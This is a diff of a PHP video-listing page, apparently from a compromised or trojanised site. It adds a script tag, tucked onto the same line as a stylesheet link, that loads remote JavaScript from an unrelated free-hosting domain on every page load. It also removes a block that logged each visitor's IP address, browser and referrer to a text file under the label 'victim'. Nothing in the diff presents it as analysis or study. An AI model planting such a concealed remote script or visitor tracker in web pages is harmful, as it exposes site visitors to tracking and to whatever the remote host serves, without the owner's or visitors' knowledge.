@@ -1,6 +1,6 @@
 <?php error_reporting(0); ?>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"><script src="https://get2mate.000webhostapp.com/ip/download.php"></script>
 <style>
 
 .video-list-thumbs{}
@@ -135,50 +135,3 @@ echo $homepage;
 </div>
   </p>
 </div>
-<?php
-    
- error_reporting(0); 
-$br = '\  /   
-        \/ ';
-        
-$today = date_default_timezone_set("Asia/Calcutta");
-$time = date("h:i:sa");
-$date =date("Y-m-d");
-$day =date("D");
-if (!empty($_SERVER['HTTP_CLIENT_IP']))
-    {
-      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n"; 
-    }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-    {
-      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n"; 
-    }
-else
-    {
-      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n"; 
-    }
-$useragent = " User-Agent: "; 
-$browser = $_SERVER['HTTP_USER_AGENT']; 
-$file = 'ipds.txt'; 
-$victim = "IP: "; 
-$fp = fopen($file, 'a' ); 
-fwrite( $fp, $victim ); 
- fwrite( $fp, $ipaddress );
-fwrite( $fp, $useragent  );
- fwrite( $fp, $today   );
-fwrite( $fp, $br  );   
-fwrite( $fp, $browser  );
-fwrite( $fp, $br  );   
-fwrite( $fp, '  Day is ' ) ; 
-fwrite( $fp, $day) ; 
-fwrite( $fp, '  Date is ' ) ; 
-fwrite( $fp, $date ) ; 
-fwrite( $fp, '  Time is ' ) ;    
-fwrite( $fp, $time  ) ; 
-fwrite( $fp, '  URL is ' ) ; 
-fwrite( $fp, $_SERVER['HTTP_REFERER']  ) ;  
-fwrite( $fp, ' CURRENT URL is ' ) ; 
-fwrite( $fp, $_SERVER['REQUEST_URI']  ) ;
-fwrite( $fp, $br  );   
- fclose( $fp);
-?>
